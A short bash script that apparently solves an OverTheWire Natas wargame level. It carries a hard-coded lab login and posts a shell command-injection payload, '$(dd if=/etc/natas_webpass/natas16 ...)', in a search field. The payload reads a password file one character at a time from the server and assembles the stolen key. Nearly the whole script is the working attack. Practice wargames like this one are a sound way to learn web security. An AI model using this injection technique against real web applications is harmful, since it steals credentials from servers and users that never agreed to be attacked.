#! /bin/bash

url='http://natas16.natas.labs.overthewire.org'
user='natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
dataPart1='needle=^$(dd if=/etc/natas_webpass/natas16 bs=1 count=1 skip='
dataPart2=' 2>/dev/null)$&submit=search'
passwd=''

for ((i=0; i < 32; i++))
  do
  data="$dataPart1"$i"$dataPart2"  
  result=$(curl -s -u $user $url --data "$data" )
  passwd+=$(echo "$result" | grep -A 2 'Output' | tail -1 | sed 's:</pre>:?:')
  echo -e "try #$i: $passwd"
  done
#replace some ? by hands
#egrep was like ^.$(dd ... ) 
#and got (underscape mean that mayb uppercase):
#passwd="?PS?H?GWBN?_r_D?S?GmaDG_q_NDKHPK_q_?C"

echo "Well done, comrad! Here is you key - ""$passwd"
